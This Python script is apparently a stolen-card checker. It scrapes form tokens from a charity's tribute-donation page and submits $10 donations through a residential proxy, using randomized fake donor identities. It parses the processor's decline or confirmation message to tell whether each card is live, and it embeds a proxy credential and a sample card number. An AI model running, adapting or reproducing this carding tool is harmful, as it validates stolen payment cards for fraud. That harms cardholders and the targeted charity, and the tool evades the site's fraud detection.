import random
import string
import requests
from user_agent import generate_user_agent
from proxy import reqproxy, make_request
import json
import re
import base64
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
from urllib.parse import urlparse, urlencode, parse_qs

#============================================
def generate_full_name():
    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan", "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa", "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha", "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada", "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar", "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia", "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem", "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia", "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"]
    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown", "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White", "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar", "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera", "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza", "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard", "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell", "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"]
    return random.choice(first_names), random.choice(last_names)

def generate_address():
    cities = ["London", "Birmingham", "Manchester", "Liverpool", "Leeds", "Glasgow", "Sheffield", "Edinburgh", "Bristol", "Cardiff"]
    states = ["England", "England", "England", "England", "England", "Scotland", "England", "Scotland", "England", "Wales"]
    streets = ["Baker St", "Oxford St", "High St", "King's Rd", "Abbey Rd", "The Strand", "Regent St", "Whitehall", "Fleet St", "Pall Mall"]
    zip_codes = ["SW1A 1AA", "W1D 3QF", "M1 1AE", "N1C 4AG", "EC1A 1BB", "SE1 8XX", "B1 1AA", "RG1 8DN", "SW1E 5RS", "B2 5DT"]
    
    city = random.choice(cities)
    street_address = f"{random.randint(1, 999)} {random.choice(streets)}"
    zip_code = random.choice(zip_codes)
    return street_address, city, "GB", zip_code, f"07{random.randint(100000000, 999999999)}"

def generate_email():
    return f"user{random.randint(10000,99999)}@example.com"

def generate_username():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))

def generate_random_code(length=32):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

#============================================
def Tele(ccx):
    proxy_str = "proxy.insideproxy.net:3389:res-any:pgw-df6b371b8ec65c798929f20b1b3257302159d84a48d2a1d5"
    session, ip = reqproxy(proxy_str)
    #print(f"IP Address: {ip}")
    ccx = ccx.strip()
    numbers = re.findall(r"\d+", ccx)
    n = mm = yy = cvc = ""
    if len(numbers) >= 4:
        n = numbers[0]
        mm = numbers[1]
        yy = numbers[2]
        cvc = numbers[3]
        mm = str(int(mm))
        if len(yy) == 4:
            yy = yy[-2:]

    user = generate_user_agent()
    r = requests.Session()
    r.verify = False
    
    first_name, last_name = generate_full_name()
    kaddress, city, country, postcode, phone =     generate_address()
    kaddress, city, country, postcode, phone = generate_address()
    email = generate_email()
    username = generate_username()
    corr = generate_random_code()
    sess = generate_random_code()
    nr = random.randint(100000, 999999)
    lr = random.randint(1000, 9999)
    
    cookies = {
        'spses.a553': '*',
        'sp': '6b08235f-e4be-48f5-a910-e159a808b9a1',
        'cookies_enabled': '1',
        'market_source__initial_referrer': 'https%3A%2F%2Fwww.google.com%2F',
        'market_source__referrer': 'https%3A%2F%2Fwww.google.com%2F',
        'Springboard': 'khmcz0fi41xvN7LjskwspGwbq8eSG9CkWyzaj%2BqTFbzPdrAcWtO5wgjdSgwbRbdy',
        '_gcl_au_au': '1.1.576191894.1779484212',
        '__ps_r': 'https://www.google.com/',
        '__ps_sr': 'https://www.google.com/',
        '__ps_lu': 'https://help.rescue.org/donate/make-tribute-donation',
        '__ps_slu': 'https://help.rescue.org/donate/make-tribute-donation',
        '__ps_did': 'pscrb_71fa23d3-c924-4b6c-e741-b9212ca7a916',
        '__ps_fva': '1779484212901',
        '_fbp': 'fb.1.1779484213562.198421144956204648',
        '_scid': '7s8xihmv_UbT37N9ZlEI8e7U_QB3Y4LJ',
        'visitor_id937243': '775144773',
        'visitor_id937243-hash': '0dabc3b23b347ab503faa7f43516ab22dca191f61ea436fe27faac767be54172ad65c57bc5de7c0dd2ff63fb2dca8141bba87872',
        '_ga': 'GA1.1.20830764.1779484218',
        '_gcl_au': '1.1.1686559377.1779484218',
        '_tt_enable_cookie': '1',
        '_ttp': '01KS8RCMSXB93YWK5C5XTZM3YG_.tt.1',
        '_pin_unauth': 'dWlkPU9UWmxObUk0Tm1JdFpUTmlZaTAwTXpNeExUZ3dZMkV0WldJd05EbGlNakV4TldFeg',
        '_sctr': '1%7C1779469200000',
        'OptanonConsent': 'isGpcEnabled=0&datestamp=Sat+May+23+2026+04%3A11%3A54+GMT%2B0700+(Indochina+Time)&version=202501.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&landingPath=https%3A%2F%2Fhelp.rescue.org%2Fdonate%2Fmake-tribute-donation&groups=C0001%3A1%2CC0003%3A1%2CC0004%3A1%2CC0002%3A1%2CC0005%3A1',
        '_ga_DDZCWB8N2Y': 'GS2.1.s1779484212$o1$g1$t1779484318$j23$l0$h0',
        '_ga_MCH4QLVDRD': 'GS2.1.s1779484170$o2$g1$t1779484319$j11$l0$h0',
        '_scid_r': '-U8xihmv_UbT37N9ZlEI8e7U_QB3Y4LJIUkVMg',
        '_uetsid': 'a02637d0562211f1a0e0f57cd56883eb|113s75g|2|g69|0|2333',
        '_uetvid': 'a0271b20562211f19344e3254cbdee64|1s3en8c|1779484290704|3|1|bat.bing.com/p/conversions/c/t',
        'ttcsid_CVI0IOJC77U26P8I9H10': '1779484218197::hC72Ltpr1zSHnOcFhrCI.1.1779484323557.1',
        'ttcsid': '1779484218200::w3--kiPxqoQniYULAzUw.1.1779484323556.0::1.93975.104199::0.0.0.0::127337.5.0',
        'spid.a553': '1240fe3c-a3ba-4406-a188-ed4613f422ad.1779484203.2.1779484349..38842ac6-f857-41a7-b652-3dd83e0b798e..d38cee2c-432f-4925-9e97-905b148a48fa.1779484203434.21',
    }
    
    headers = {
        'authority': 'help.rescue.org',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        # 'cookie': 'spses.a553=*; sp=6b08235f-e4be-48f5-a910-e159a808b9a1; cookies_enabled=1; market_source__initial_referrer=https%3A%2F%2Fwww.google.com%2F; market_source__referrer=https%3A%2F%2Fwww.google.com%2F; Springboard=khmcz0fi41xvN7LjskwspGwbq8eSG9CkWyzaj%2BqTFbzPdrAcWtO5wgjdSgwbRbdy; _gcl_au_au=1.1.576191894.1779484212; __ps_r=https://www.google.com/; __ps_sr=https://www.google.com/; __ps_lu=https://help.rescue.org/donate/make-tribute-donation; __ps_slu=https://help.rescue.org/donate/make-tribute-donation; __ps_did=pscrb_71fa23d3-c924-4b6c-e741-b9212ca7a916; __ps_fva=1779484212901; _fbp=fb.1.1779484213562.198421144956204648; _scid=7s8xihmv_UbT37N9ZlEI8e7U_QB3Y4LJ; visitor_id937243=775144773; visitor_id937243-hash=0dabc3b23b347ab503faa7f43516ab22dca191f61ea436fe27faac767be54172ad65c57bc5de7c0dd2ff63fb2dca8141bba87872; _ga=GA1.1.20830764.1779484218; _gcl_au=1.1.1686559377.1779484218; _tt_enable_cookie=1; _ttp=01KS8RCMSXB93YWK5C5XTZM3YG_.tt.1; _pin_unauth=dWlkPU9UWmxObUk0Tm1JdFpUTmlZaTAwTXpNeExUZ3dZMkV0WldJd05EbGlNakV4TldFeg; _sctr=1%7C1779469200000; OptanonConsent=isGpcEnabled=0&datestamp=Sat+May+23+2026+04%3A11%3A54+GMT%2B0700+(Indochina+Time)&version=202501.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&landingPath=https%3A%2F%2Fhelp.rescue.org%2Fdonate%2Fmake-tribute-donation&groups=C0001%3A1%2CC0003%3A1%2CC0004%3A1%2CC0002%3A1%2CC0005%3A1; _ga_DDZCWB8N2Y=GS2.1.s1779484212$o1$g1$t1779484318$j23$l0$h0; _ga_MCH4QLVDRD=GS2.1.s1779484170$o2$g1$t1779484319$j11$l0$h0; _scid_r=-U8xihmv_UbT37N9ZlEI8e7U_QB3Y4LJIUkVMg; _uetsid=a02637d0562211f1a0e0f57cd56883eb|113s75g|2|g69|0|2333; _uetvid=a0271b20562211f19344e3254cbdee64|1s3en8c|1779484290704|3|1|bat.bing.com/p/conversions/c/t; ttcsid_CVI0IOJC77U26P8I9H10=1779484218197::hC72Ltpr1zSHnOcFhrCI.1.1779484323557.1; ttcsid=1779484218200::w3--kiPxqoQniYULAzUw.1.1779484323556.0::1.93975.104199::0.0.0.0::127337.5.0; spid.a553=1240fe3c-a3ba-4406-a188-ed4613f422ad.1779484203.2.1779484349..38842ac6-f857-41a7-b652-3dd83e0b798e..d38cee2c-432f-4925-9e97-905b148a48fa.1779484203434.21',
        #'if-none-match': '"1779484209-1"',
        'referer': 'https://www.google.com/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'cross-site',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }
    
    response = session.get('https://help.rescue.org/donate/make-tribute-donation', #cookies=cookies, 
    headers=headers)
    
    cid = re.search(r'name="submitted\[cid\]" value="(.*?)"', response.text).group(1)
    build = re.search(r'name="form_build_id" value="(.*?)"', response.text).group(1)
    form = re.search(r'name="form_id" value="(.*?)"', response.text).group(1)
    print(cid)
    print(build)
    print(form)
    
    cookies = {
        'spses.a553': '*',
        'sp': '6b08235f-e4be-48f5-a910-e159a808b9a1',
        'cookies_enabled': '1',
        'market_source__initial_referrer': 'https%3A%2F%2Fwww.google.com%2F',
        'market_source__referrer': 'https%3A%2F%2Fwww.google.com%2F',
        'Springboard': 'khmcz0fi41xvN7LjskwspGwbq8eSG9CkWyzaj%2BqTFbzPdrAcWtO5wgjdSgwbRbdy',
        '_gcl_au_au': '1.1.576191894.1779484212',
        '__ps_r': 'https://www.google.com/',
        '__ps_sr': 'https://www.google.com/',
        '__ps_lu': 'https://help.rescue.org/donate/make-tribute-donation',
        '__ps_slu': 'https://help.rescue.org/donate/make-tribute-donation',
        '__ps_did': 'pscrb_71fa23d3-c924-4b6c-e741-b9212ca7a916',
        '__ps_fva': '1779484212901',
        '_fbp': 'fb.1.1779484213562.198421144956204648',
        '_scid': '7s8xihmv_UbT37N9ZlEI8e7U_QB3Y4LJ',
        '_twpid': 'tw.1779484217425.328858350366922472',
        'visitor_id937243': '775144773',
        'visitor_id937243-hash': '0dabc3b23b347ab503faa7f43516ab22dca191f61ea436fe27faac767be54172ad65c57bc5de7c0dd2ff63fb2dca8141bba87872',
        '_ga': 'GA1.1.20830764.1779484218',
        '_tt_enable_cookie': '1',
        '_ttp': '01KS8RCMSXB93YWK5C5XTZM3YG_.tt.1',
        '_pin_unauth': 'dWlkPU9UWmxObUk0Tm1JdFpUTmlZaTAwTXpNeExUZ3dZMkV0WldJd05EbGlNakV4TldFeg',
        '__stripe_mid': '0b5a68bf-efec-45f6-8929-c097ce79455ec50313',
        '__stripe_sid': '83977cb3-371f-4c22-8a7c-4f29cb231cf7459584',
        'cebs': '1',
        '_ce.clock_data': '-960%2C18.143.173.143%2C2%2Cebf1ad94f36d69f16f9f152425971244%2CChrome%2CSG',
        '_sctr': '1%7C1779469200000',
        'OptanonConsent': 'isGpcEnabled=0&datestamp=Sat+May+23+2026+04%3A12%3A37+GMT%2B0700+(Indochina+Time)&version=202501.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&landingPath=https%3A%2F%2Fhelp.rescue.org%2Fdonate%2Fmake-tribute-donation&groups=C0001%3A1%2CC0003%3A1%2CC0004%3A1%2CC0002%3A1%2CC0005%3A1',
        '_ga_DDZCWB8N2Y': 'GS2.1.s1779484212$o1$g1$t1779484357$j58$l0$h0',
        '_scid_r': '-k8xihmv_UbT37N9ZlEI8e7U_QB3Y4LJIUkVMw',
        '_uetsid': 'a02637d0562211f1a0e0f57cd56883eb|113s75g|2|g69|0|2333',
        'ttcsid_CVI0IOJC77U26P8I9H10': '1779484218197::hC72Ltpr1zSHnOcFhrCI.1.1779484364577.1',
        'cebsp_': '5',
        '_uetvid': 'a0271b20562211f19344e3254cbdee64|1s3en8c|1779484364961|4|1|bat.bing.com/p/conversions/c/t',
        'spid.a553': '1240fe3c-a3ba-4406-a188-ed4613f422ad.1779484203.2.1779484446..38842ac6-f857-41a7-b652-3dd83e0b798e..d38cee2c-432f-4925-9e97-905b148a48fa.1779484203434.44',
        '_ga_MCH4QLVDRD': 'GS2.1.s1779484170$o2$g1$t1779484446$j60$l0$h0',
        '_gcl_au': '1.1.1686559377.1779484218.2144371608.1779484446.1779484446',
        'ttcsid': '1779484218200::w3--kiPxqoQniYULAzUw.1.1779484364576.0::1.136745.145079::227970.14.87.3727::228360.53.0',
        '_ce.s': 'v11ls~a336cb30-5622-11f1-ac5c-21fa0dc90fb2~v~b0bb72608a086483adbff107d3be7330567f1b9b~vir~new~lva~1779484218559~vpv~0~v11.cs~298784~v11.s~a336cb30-5622-11f1-ac5c-21fa0dc90fb2~v11.vs~b0bb72608a086483adbff107d3be7330567f1b9b~v11.sla~1779484219271~gtrk.la~mphf3elh~lcw~1779484446630',
    }
    
    headers = {
        'authority': 'help.rescue.org',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        #'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryBt9AwaOoS2rMrDJB',
        # 'cookie': 'spses.a553=*; sp=6b08235f-e4be-48f5-a910-e159a808b9a1; cookies_enabled=1; market_source__initial_referrer=https%3A%2F%2Fwww.google.com%2F; market_source__referrer=https%3A%2F%2Fwww.google.com%2F; Springboard=khmcz0fi41xvN7LjskwspGwbq8eSG9CkWyzaj%2BqTFbzPdrAcWtO5wgjdSgwbRbdy; _gcl_au_au=1.1.576191894.1779484212; __ps_r=https://www.google.com/; __ps_sr=https://www.google.com/; __ps_lu=https://help.rescue.org/donate/make-tribute-donation; __ps_slu=https://help.rescue.org/donate/make-tribute-donation; __ps_did=pscrb_71fa23d3-c924-4b6c-e741-b9212ca7a916; __ps_fva=1779484212901; _fbp=fb.1.1779484213562.198421144956204648; _scid=7s8xihmv_UbT37N9ZlEI8e7U_QB3Y4LJ; _twpid=tw.1779484217425.328858350366922472; visitor_id937243=775144773; visitor_id937243-hash=0dabc3b23b347ab503faa7f43516ab22dca191f61ea436fe27faac767be54172ad65c57bc5de7c0dd2ff63fb2dca8141bba87872; _ga=GA1.1.20830764.1779484218; _tt_enable_cookie=1; _ttp=01KS8RCMSXB93YWK5C5XTZM3YG_.tt.1; _pin_unauth=dWlkPU9UWmxObUk0Tm1JdFpUTmlZaTAwTXpNeExUZ3dZMkV0WldJd05EbGlNakV4TldFeg; __stripe_mid=0b5a68bf-efec-45f6-8929-c097ce79455ec50313; __stripe_sid=83977cb3-371f-4c22-8a7c-4f29cb231cf7459584; cebs=1; _ce.clock_data=-960%2C18.143.173.143%2C2%2Cebf1ad94f36d69f16f9f152425971244%2CChrome%2CSG; _sctr=1%7C1779469200000; OptanonConsent=isGpcEnabled=0&datestamp=Sat+May+23+2026+04%3A12%3A37+GMT%2B0700+(Indochina+Time)&version=202501.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&landingPath=https%3A%2F%2Fhelp.rescue.org%2Fdonate%2Fmake-tribute-donation&groups=C0001%3A1%2CC0003%3A1%2CC0004%3A1%2CC0002%3A1%2CC0005%3A1; _ga_DDZCWB8N2Y=GS2.1.s1779484212$o1$g1$t1779484357$j58$l0$h0; _scid_r=-k8xihmv_UbT37N9ZlEI8e7U_QB3Y4LJIUkVMw; _uetsid=a02637d0562211f1a0e0f57cd56883eb|113s75g|2|g69|0|2333; ttcsid_CVI0IOJC77U26P8I9H10=1779484218197::hC72Ltpr1zSHnOcFhrCI.1.1779484364577.1; cebsp_=5; _uetvid=a0271b20562211f19344e3254cbdee64|1s3en8c|1779484364961|4|1|bat.bing.com/p/conversions/c/t; spid.a553=1240fe3c-a3ba-4406-a188-ed4613f422ad.1779484203.2.1779484446..38842ac6-f857-41a7-b652-3dd83e0b798e..d38cee2c-432f-4925-9e97-905b148a48fa.1779484203434.44; _ga_MCH4QLVDRD=GS2.1.s1779484170$o2$g1$t1779484446$j60$l0$h0; _gcl_au=1.1.1686559377.1779484218.2144371608.1779484446.1779484446; ttcsid=1779484218200::w3--kiPxqoQniYULAzUw.1.1779484364576.0::1.136745.145079::227970.14.87.3727::228360.53.0; _ce.s=v11ls~a336cb30-5622-11f1-ac5c-21fa0dc90fb2~v~b0bb72608a086483adbff107d3be7330567f1b9b~vir~new~lva~1779484218559~vpv~0~v11.cs~298784~v11.s~a336cb30-5622-11f1-ac5c-21fa0dc90fb2~v11.vs~b0bb72608a086483adbff107d3be7330567f1b9b~v11.sla~1779484219271~gtrk.la~mphf3elh~lcw~1779484446630',
        'origin': 'https://help.rescue.org',
        'referer': 'https://help.rescue.org/donate/make-tribute-donation',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }
    
    files = {
        'submitted[donation][recurring_amount]': (None, ''),
        'submitted[donation][recurring_other_amount]': (None, ''),
        'submitted[ms]': (None, ''),
        'submitted[cid]': (None, f'{cid}'),
        'submitted[donation][amount]': (None, 'other'),
        'submitted[donation][other_amount]': (None, '10.00'),
        'submitted[choose_your_card][gift_card_type]': (None, 'none'),
        'submitted[choose_your_card][card]': (None, 'baby_kits'),
        'submitted[choose_your_card][customize_your_ecard][tribute_type]': (None, 'in honor of'),
        'submitted[choose_your_card][customize_your_ecard][card_honoree]': (None, ''),
        'submitted[choose_your_card][customize_your_ecard][recipient_email_address]': (None, ''),
        'submitted[choose_your_card][customize_your_ecard][card_honorer]': (None, ''),
        'submitted[choose_your_card][customize_your_ecard][card_message]': (None, ''),
        'submitted[recipient_information][recipient_first_name]': (None, ''),
        'submitted[recipient_information][recipient_last_name]': (None, ''),
        'submitted[recipient_information][recipient_address]': (None, ''),
        'submitted[recipient_information][recipient_address_2]': (None, ''),
        'submitted[recipient_information][recipient_city]': (None, ''),
        'submitted[recipient_information][recipient_state_province]': (None, ''),
        'submitted[recipient_information][recipient_zippostal_code]': (None, ''),
        'submitted[recipient_information][recipient_country]': (None, 'USA'),
        'submitted[donor_information][first_name]': (None, f'{first_name}'),
        'submitted[donor_information][last_name]': (None, f'{last_name}'),
        'submitted[donor_information][mail]': (None, f'rodamuser{nr}@gmail.com'),
        'submitted[billing_information][address]': (None, '27 Allen St'),
        'submitted[billing_information][address_line_2]': (None, ''),
        'submitted[billing_information][city]': (None, 'New York'),
        'submitted[billing_information][state]': (None, 'NY'),
        'submitted[billing_information][zip]': (None, '10002'),
        'submitted[billing_information][country]': (None, 'US'),
        'submitted[telephone]': (None, ''),
        'submitted[payment_information][payment_method]': (None, 'credit'),
        'submitted[payment_information][payment_fields][credit][card_number]': (None, f'{n}'),
        'submitted[payment_information][payment_fields][credit][expiration_date][card_expiration_month]': (None, f'{mm}'),
        'submitted[payment_information][payment_fields][credit][expiration_date][card_expiration_year]': (None, f'20{yy}'),
        'submitted[payment_information][payment_fields][credit][card_cvv]': (None, f'{cvc}'),
        'submitted[payment_information][payment_fields][credit][card_type]': (None, ''),
        'submitted[payment_information][payment_fields][credit][session_id]': (None, ''),
        'braintree[errors]': (None, ''),
        'payment_method_nonce': (None, ''),
        'submitted[payment_information][payment_fields][paypal][braintree_card_type]': (None, ''),
        'submitted[payment_information][payment_fields][paypal][braintree_last4]': (None, ''),
        'submitted[payment_information][payment_fields][bank account][accType]': (None, 'Checking'),
        'submitted[payment_information][payment_fields][bank account][routingNum]': (None, ''),
        'submitted[payment_information][payment_fields][bank account][accNum]': (None, ''),
        'submitted[payment_information][payment_fields][bank account][phone]': (None, ''),
        'submitted[payment_information][payment_fields][bank account][session_id]': (None, ''),
        'submitted[payment_information][recurs_monthly]': (None, 'NO_RECURR'),
        'submitted[payment_information][processing_fee_amount]': (None, ''),
        'submitted[referrer]': (None, 'https://www.google.com/'),
        'submitted[initial_referrer]': (None, 'https://www.google.com/'),
        'submitted[search_engine]': (None, 'Google'),
        'submitted[search_string]': (None, ''),
        'submitted[secure_prepop_autofilled]': (None, '0'),
        'submitted[springboard_cookie_autofilled]': (None, 'disabled'),
        'submitted[content_override_id]': (None, ''),
        'submitted[gs_flag]': (None, 'None'),
        'submitted[user_agent]': (None, f'{user}'),
        'submitted[device_type]': (None, ''),
        'submitted[device_name]': (None, ''),
        'submitted[device_os]': (None, ''),
        'submitted[device_browser]': (None, ''),
        'submitted[utm_source]': (None, ''),
        'submitted[utm_medium]': (None, ''),
        'submitted[utm_term]': (None, ''),
        'submitted[utm_content]': (None, ''),
        'submitted[field_sbp_referrer_long]': (None, ''),
        'submitted[utm_campaign]': (None, ''),
        'submitted[field_sbp_initial_referrer_long]': (None, ''),
        'submitted[eml_name]': (None, ''),
        'submitted[field_form]': (None, ''),
        'submitted[eml_id]': (None, ''),
        'submitted[field_form_url]': (None, ''),
        'submitted[social_referer_transaction]': (None, ''),
        'submitted[p2p_pcid]': (None, ''),
        'submitted[sbp_zip_plus_four]': (None, ''),
        'submitted[initialms]': (None, ''),
        'submitted[irc_fundraising_office]': (None, 'US'),
        'details[sid]': (None, ''),
        'details[page_num]': (None, '1'),
        'details[page_count]': (None, '1'),
        'details[finished]': (None, '0'),
        'form_build_id': (None, f'{build}'),
        'form_id': (None, f'{form}'),
        'springboard_fraud_token': (None, ''),
        'springboard_fraud_js_detect': (None, ''),
        'op': (None, 'Donate'),
    }
    
    response = session.post('https://help.rescue.org/donate/make-tribute-donation', #cookies=cookies, 
    headers=headers, files=files)
    
    try:
        result = re.search(r'<li>We received an error processing your card. Please enter your information again or try a different card.<\/li>\s*<li>(.*?)<\/li>', response.text).group(1)
    except:
        result = re.search(r'<div class="webform-confirmation">\s*<div class="(.*?)"', response.text).group(1)
    return result
    
#test_card = "4100390778352118 07/28 772 33523"
#print(Tele(test_card))
